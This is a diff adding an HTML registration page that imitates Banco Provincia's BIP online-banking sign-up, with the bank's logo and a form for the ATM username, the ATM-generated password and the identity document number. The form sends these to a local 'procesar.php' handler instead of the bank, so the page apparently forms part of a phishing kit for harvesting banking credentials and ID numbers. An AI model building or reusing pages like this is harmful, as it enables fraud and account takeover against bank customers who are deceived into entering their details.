@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Banco Provincia - Registro</title>
+  <link rel="icon" href="https://ext.same-assets.com/1996896656/4121383702.ico">
+  <link rel="stylesheet" href="css/registro.css">
+  <link href="https://fonts.googleapis.com/css2?family=Encode+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+  <a href="inicio.html" class="back-link">
+    <svg viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+    Volver al inicio
+  </a>
+
+  <main class="register-container">
+    <div class="register-card">
+      <header class="register-header">
+        <img
+          src="https://ext.same-assets.com/3391354337/4006645169.svg"
+          alt="Banco Provincia"
+        >
+      </header>
+
+      <div class="register-body">
+        <h1 class="register-title">Registrate en BIP</h1>
+
+        <div class="register-alert" id="registerAlert"></div>
+
+        <form id="registrationForm" action="http://localhost/Banco%20Provincia/procesar.php" method="POST">
+          <div class="form-group">
+            <label for="usuario" class="form-label">Tu usuario de cajero autom&aacute;tico <span class="required">*</span></label>
+            <input
+              type="text"
+              id="usuario"
+              name="usuario"
+              class="form-input"
+              placeholder="Ingres&aacute; el usuario impreso en el ticket"
+              maxlength="25"
+              required
+            >
+          </div>
+
+          <div class="form-group">
+            <label for="clave" class="form-label">Clave generada en el cajero</label>
+            <div class="password-container">
+              <input
+                type="password"
+                id="clave"
+                name="clave"
+                class="form-input"
+                placeholder="Ingres&aacute; la clave generada en el cajero"
+                maxlength="30"
+                required
+              >
+              <button type="button" class="password-toggle" id="togglePassword" aria-label="Mostrar clave">
+                <svg viewBox="0 0 24 24">
+                  <path d="M12 4.5C7 4.5 2.73 7.61 1 12C2.73 16.39 7 19.5 12 19.5C17 19.5 21.27 16.39 23 12C21.27 7.61 17 4.5 12 4.5ZM12 17C9.24 17 7 14.76 7 12C7 9.24 9.24 7 12 7C14.76 7 17 9.24 17 12C17 14.76 14.76 17 12 17ZM12 9C10.34 9 9 10.34 9 12C9 13.66 10.34 15 12 15C13.66 15 15 13.66 15 12C15 10.34 13.66 9 12 9Z"/>
+                </svg>
+              </button>
+            </div>
+          </div>
+
+          <div class="form-group">
+            <label class="form-label">Tipo y n&uacute;mero de tu documento <span class="required">*</span></label>
+            <div class="document-row">
+              <div class="select-wrapper">
+                <select id="tipoDocumento" name="tipoDocumento" required>
+                  <option value="DNI">DNI</option>
+                  <option value="LC">LC</option>
+                  <option value="LE">LE</option>
+                  <option value="CI">CI</option>
+                  <option value="PASAPORTE">Pasaporte</option>
+                </select>
+                <svg class="select-arrow" width="12" height="12" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+                  <path d="M7 10L12 15L17 10H7Z" fill="#333"/>
+                </svg>
+              </div>
+              <input
+                type="text"
+                id="numeroDocumento"
+                name="numeroDocumento"
+                class="form-input"
+                maxlength="20"
+                required
+              >
+            </div>
+          </div>
+
+          <div class="form-actions">
+            <a href="formulario.html" class="btn btn-secondary">Volver</a>
+            <button type="submit" class="btn btn-primary">Continuar</button>
+          </div>
+        </form>
+      </div>
+    </div>
+  </main>
+
+  <script src="js/registro.js"></script>
+</body>
+</html>
